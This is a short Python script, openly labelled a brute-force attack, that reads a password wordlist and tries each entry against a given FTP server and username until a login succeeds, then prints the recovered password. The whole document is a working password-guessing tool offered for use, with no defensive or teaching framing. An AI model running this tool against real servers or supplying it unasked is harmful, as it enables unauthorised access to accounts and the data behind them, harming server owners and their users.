#! /usr/bin/python3

import ftplib

server = input("FTP Server: ")
user = input("username: ")
Passwordlist = input("Path to a wordlist > ")

try:
	with open(Passwordlist, 'r') as Wfile:
		print("\n[+] Starting brute-force attack...")

		for password in Wfile:

			password = password.strip('\r\n')

			try:
				ftp = ftplib.FTP(server, timeout=3)
				ftp.login(user, password)

				print(f"\n[+] Success! The {user}'s password is: '{password}'")
				break

			except ftplib.error_perm:
				pass

			except Exception as e:
				print(f"[!] Connection error with password '{password}': {e}")
				break

except FileNotFoundError:
	print(f"\n[!] Error with the wordlist, maybe not exists '{Passwordlist}'")
